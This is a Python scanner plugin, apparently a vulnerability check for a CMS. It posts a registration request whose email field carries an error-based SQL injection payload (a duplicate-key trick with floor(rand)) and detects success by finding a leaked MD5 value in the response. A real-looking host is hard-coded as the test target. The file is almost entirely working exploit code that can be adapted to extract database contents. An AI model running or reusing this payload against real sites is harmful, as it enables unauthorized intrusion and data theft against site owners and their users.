#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib
from mycurl import *
import random
import string


"""
插件注释说明

"""
def scan_url(url):
    salt = ''.join(random.sample(string.ascii_letters + string.digits, 8))
    target = url + '/index.php?m=member&f=register_save'
    payload = 'username=' + salt + '&password=123456&password2=123456&fields%5Btruename%5D=qqqqqqqqq&fields%5Bemail%5D=1\' and(select 1 from(select count(*),concat((select (select (SELECT md5(233))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#&submit=+%D7%A2+%B2%E1+'
    code, head, body, errcode, redirect_url = curl.request(target, method='POST', data=payload)
    if 'e165421110ba03099a1c0393373c5b431' in body:
        # 存在漏洞则返回True
        return True
    return False

# 本地测试时需要加 main 用于调用
if __name__ == '__main__':
    from mycurl import *
    res = scan_url("http://xss.wenrugou.xyz/")
    print(res)
